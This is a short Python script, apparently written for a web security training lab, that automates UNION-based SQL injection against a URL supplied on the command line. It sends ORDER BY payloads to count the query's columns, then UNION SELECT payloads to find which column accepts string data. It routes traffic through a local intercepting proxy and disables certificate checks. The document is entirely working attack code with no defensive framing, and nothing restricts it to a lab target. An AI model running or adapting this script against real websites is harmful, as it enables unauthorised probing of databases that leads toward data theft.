import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_orderby(url):
    for i in range(1,10):
        r = requests.get(url + f"'+ORDER+BY+{i}--", verify=False, proxies=proxies)
        if r.status_code == 200:
            print(f'{i} ORDER BY successful')
        else:
            print(f'{i} ORDER BY unsuccessful')
            columns = i -1
            print(f'Columns:{columns}')
            break
    return (columns)

# Create list of nulls for each column
def create_nulls(num_columns):
    print(f'Number of columns: {num_columns}')
    the_nulls = []
    for i in range(0,num_columns):
        the_nulls.insert(0,'null')
    return the_nulls

def string_check(url,num_columns,the_nulls):
    # Loops through the_nulls swapping in 'a' in each position based on the value of i
    for i in range(0,num_columns):
        the_nulls.pop(0) # Take a null off the front
        the_nulls.insert(i, "'ibDJAv'") # Put an a in the correct spot
        space_string = ","
        null_string = space_string.join(the_nulls)
        payload = "'+UNION+SELECT+" + null_string + '--'
        #print(payload)
        r = requests.get(url + payload, verify=False, proxies=proxies)
        if r.status_code == 200:
            print(f'String input valid in column {i}.')
            
        # If r.status != 500, success?
        the_nulls.pop(i) # Remove 'a'
        the_nulls.append('null') # Put a null back

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('Running ORDER BY exploit')
    num_columns = exploit_orderby(url)
    print('Creating list')
    the_nulls = create_nulls(num_columns)
    print('Running UNION exploit')
    string_check(url, num_columns, the_nulls)
